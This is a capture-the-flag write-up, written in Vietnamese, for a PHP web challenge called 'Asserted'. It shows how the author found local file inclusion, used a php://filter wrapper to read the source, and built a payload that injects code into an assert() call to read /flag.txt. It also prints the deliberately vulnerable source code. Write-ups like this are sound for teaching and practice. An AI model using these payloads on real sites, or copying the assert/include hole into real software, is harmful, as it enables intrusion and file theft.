Asserted
===
**Category:** Web

**Author:** dead#4282 & @JohnHammond#6971

**Point:**

### Description
```
Time to hit the gym! Assert all your energy! Err, wait, is the saying "exert" all your energy? I don't know...
The flag is in /flag.txt.
```

### Overview
- Đầu tiên ta vào trang web thì thấy được giao diện khá là đẹp :) có vẻ như về chủ đề là gym. Sau một hồi khám phá click từng mục và kiểm tra trên thanh url thì phát được `/index.php?page=about` nhìn trông có vẻ như là lfi nên vì đó mình đã thử lfi và kết quả thành công

### Solution
- Đã biết được lfi nên bây giờ chúng ta chỉ cần láy source nó về và đọc `php://filter/convert.base64-encode/resource=index`
- Source của index:
```php
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
  
} else {
  $file = "home.php";
}

include($file);

?>
```
Nhìn vào code chúng ta có thể đoạn được rằng chúng ta phải injection vào `assert`. Chúng ta có thể code vào ở phía sau của `asert` để đọc được file mà mình thích

##### Payload
```
/index.php?page=', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
```
Sau khi injection đoạn code trên vào thì assert ở phí trên code sẽ trở thành như này
```php
assert("strpos('', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
```
